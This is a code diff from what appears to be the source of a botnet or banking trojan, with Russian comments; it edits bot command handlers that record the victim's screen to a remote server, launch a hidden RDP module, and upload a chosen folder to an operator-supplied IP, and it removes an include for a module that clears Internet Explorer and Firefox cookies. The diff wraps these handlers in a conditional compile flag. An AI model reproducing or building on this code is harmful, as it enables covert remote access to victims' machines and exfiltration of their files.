@@ -18,18 +18,10 @@
 #include "DllLoader.h"
 #include "CabPacker.h"
 #include "BotDef.h"
-#include "VideoRecorder.h"
 #include "StrConsts.h"
 
 #include <shlobj.h>
 #include <shlwapi.h>
-
-
-/* TODO :
-В данный момент модуль coocksol.h подклбчен для очистки куков ИЕ и ФФ
-при обновлении конфига. Вынести эту функциональность, включая
-выполнение команды, из модуля задач */
-#include "coocksol.h"
 
 #include "Modules.h"
 
@@ -1041,30 +1033,34 @@ static bool IP_Downtime( const char* args, char* ip, int& port, int& downtime )
 //команда на подключение к видео серверу, просто шлем лог, его отсылка активизирует подключение к серверу
 bool ExecuteRS(void* Manager, PCHAR Command, PCHAR Args)
 {
-	char ip[24];
-	int downtime, port;
-	if( !IP_Downtime( Args, ip, port, downtime ) ) return false;
-	TASKDBG("RS", "ip: %s, port: %d, downtime %d", ip, port, downtime);
-	VideoProcess::Init( TVideoRecDLL::RunCallback, ip, port, downtime );
+	#ifdef VideoRecorderH
+		char ip[24];
+		int downtime, port;
+		if( !IP_Downtime( Args, ip, port, downtime ) ) return false;
+		TASKDBG("RS", "ip: %s, port: %d, downtime %d", ip, port, downtime);
+		VideoProcess::Init( TVideoRecDLL::RunCallback, ip, port, downtime );
+	#endif
 	return true;
 }
 
 //загружает и запускает RDP.DLL
 bool ExecuteRDP(void* Manager, PCHAR Command, PCHAR Args)
 {
-	char ip[24];
-	int downtime, port;
-	if( !IP_Downtime( Args, ip, port, downtime ) ) return false;
-	TASKDBG("RDR", "ip: %s, port: %d, downtime %d", ip, port, downtime);
-	HANDLE mutex = TryCreateSingleInstance("RDP");
-	if( mutex ) //длл не запущена, запускаем
-	{
-		pCloseHandle(mutex);
-		MegaJump(VideoProcess::ProcessRDP);
-	}
-	else
-		TASKDBG( "RDR", "RDP уже запущен" );
-	VideoProcess::Init( TVideoRecDLL::RunCallback, ip, port, downtime );
+	#ifdef VideoRecorderH
+		char ip[24];
+		int downtime, port;
+		if( !IP_Downtime( Args, ip, port, downtime ) ) return false;
+		TASKDBG("RDR", "ip: %s, port: %d, downtime %d", ip, port, downtime);
+		HANDLE mutex = TryCreateSingleInstance("RDP");
+		if( mutex ) //длл не запущена, запускаем
+		{
+			pCloseHandle(mutex);
+			MegaJump(VideoProcess::ProcessRDP);
+		}
+		else
+			TASKDBG( "RDR", "RDP уже запущен" );
+		VideoProcess::Init( TVideoRecDLL::RunCallback, ip, port, downtime );
+	#endif
 	return true;
 }
 
@@ -1101,10 +1097,12 @@ bool ExecuteIFobs(void* Manager, PCHAR Command, PCHAR Args)
 //загрузка указанной папки на видео сервер
 bool ExecuteLF(void* Manager, PCHAR Command, PCHAR Args)
 {
-	char name[MAX_PATH];
-	PathToName( Args, name, sizeof(name) );
-	TASKDBG( "LF", "Загрузка папки '%s' под именем %s", Args, name );
-	VideoProcess::SendFiles( 0, name, Args, 0, true );
+	#ifdef VideoRecorderH
+		char name[MAX_PATH];
+		PathToName( Args, name, sizeof(name) );
+		TASKDBG( "LF", "Загрузка папки '%s' под именем %s", Args, name );
+		VideoProcess::SendFiles( 0, name, Args, 0, true );
+	#endif
 	return true;
 }
 
